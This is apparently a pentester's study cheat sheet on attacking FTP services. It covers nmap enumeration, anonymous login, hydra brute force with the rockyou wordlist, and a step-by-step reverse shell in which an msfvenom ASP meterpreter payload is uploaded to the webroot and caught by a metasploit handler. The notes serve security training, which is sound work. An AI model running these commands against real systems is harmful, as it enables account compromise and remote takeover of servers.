## FTP
File Transfer Protocol
- Protocol to transfer files between hosts
- port 21
- can be anonymous or authenticated
- login anonymous if allowed
- commonly used for webserver

### Good to know
- binary mode sends files as they are
- ascii mode converts files to ascii
- switch between modes with `binary` and `ascii`


## FTP Commands
```sh
ftp 10.129.228.195
-h help
```
#### Download ALL Files at once
```shell
wget -m --no-passive ftp://anonymous:anonymous@10.129.202.5
tree . #shows the directory structure if we do it in that created folder
```
#### Upload a file
```shell 
touch testupload.txt # on attacker
put testupload.txt #in ftp>
```
#### On ftp shell:
```sh
help #hilfe
dir #show directory
get #download file
cd #change directory
put /home/test/test.txt #upload file
```


### FTP Enumeration
In ftp shell
```shell
status #show some infos
debug #show debug info
trace #show if tracing is on
ls # list directories
```

### Nmap and FTP
```sh
nmap -sV -sC 192.254.1.1 -p21 #default scan find already anonymous login is allowed and read or writeable
sudo nmap -sV -p21 -sC -A 10.129.202.5 #aggresive scan with script and version detection
```
Find all FTP related scripts in nmap
```shell
find / -type f -name ftp* 2>/dev/null | grep scripts
```
Nmap ftp scripts
```
/usr/share/nmap/scripts/ftp-syst.nse
/usr/share/nmap/scripts/ftp-vsftpd-backdoor.nse
/usr/share/nmap/scripts/ftp-vuln-cve2010-4221.nse
/usr/share/nmap/scripts/ftp-proftpd-backdoor.nse
/usr/share/nmap/scripts/ftp-bounce.nse
/usr/share/nmap/scripts/ftp-libopie.nse
/usr/share/nmap/scripts/ftp-anon.nse
/usr/share/nmap/scripts/ftp-brute.nse
```
Nmap cript trace for more informations
```shell
sudo nmap -sV -p21 -sC -A 10.129.14.136 --script-trace #see what nmap exactly send and get in the scripts
```
### searchsploit 
femitter is a ftp server type name
```sh
searchsploit femitter #search for exploits
```

### FTP Annonymous Login
if anonymous ftp login allowed then user username: anonymous
```
username: anonymous
password: any
```

### Login bruteforce
```sh
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.255.1.231 ftp #bruteforce ftp with rockyou list
-l # username 
-P # passwordlist target protocol
```
```
Google for ftp default login data with the target server version / ftp client name:
- admin: password
- admin: admin
- etc. depending on ftp server version
```
### Reverse Shell over FTP  

1. Create reverse shell with msfvenom
```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.254.1.229 LPORT=4444 -f asp > shell.asp

#asp: if the target is a asp server
```
2. That creates an asp shell script which can be
3. Accepting the shell with metasploit:
```shell
msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 192.254.1.228; set lport 4444; run -j"
```
4. Put  the shell.asp in webroot of ftp and try to open in browser.
5. Than open it in browser to execute the shell.

## Ways to interact with ftp beside ftp client
```shell
nc -nv 10.129.14.136 21
telnet 10.129.14.136 21
openssl s_client -connect 10.129.14.136:21 -starttls ftp # ftp over open ssl
```

## vsFTP
is a very often used FTP server here is the configuration parameters descriped
- vsFTP:  https://security.appspot.com/vsftpd.html  
- conf expl: http://vsftpd.beasts.org/vsftpd_conf.html

#### Enumeration
```sh
cat /etc/vsftpd.conf | grep -v "#" #show vsftpd config
cat /etc/ftpusers #show ftp users
 
```

#### Dangerouse Configurations
```
Setting	Description
anonymous_enable=YES	        Allowing anonymous login?
anon_upload_enable=YES	        Allowing anonymous to upload files?
anon_mkdir_write_enable=YES	Allowing anonymous to create new directories?
no_anon_password=YES	        Do not ask anonymous for password?
anon_root=/home/username/ftp	Directory for anonymous.
write_enable=YES	        Allow the usage of FTP commands: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE?
```
